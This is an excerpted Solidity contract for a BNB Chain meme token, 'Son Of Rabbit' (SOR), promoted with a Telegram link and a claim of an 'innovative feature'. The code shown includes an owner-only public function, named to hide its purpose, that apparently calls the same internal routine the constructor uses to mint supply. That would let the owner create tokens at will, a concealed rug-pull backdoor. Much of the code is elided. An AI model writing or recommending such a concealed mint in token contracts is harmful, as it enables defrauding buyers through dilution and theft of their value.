...
//
// $SonOfRabbit proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/SonOfRabbitBSC
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SonOfRabbit(uint256 amount) public onlyOwner {
 _SonOfRabbit(msg.sender, amount);
    }
    ...
    function _SonOfRabbit(address account, uint256 amount) internal virtual {
...
contract $SonOfRabbit is ERC20 {
    ...
    constructor() public ERC20("Son Of Rabbit", "SOR") {
     _SonOfRabbit(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}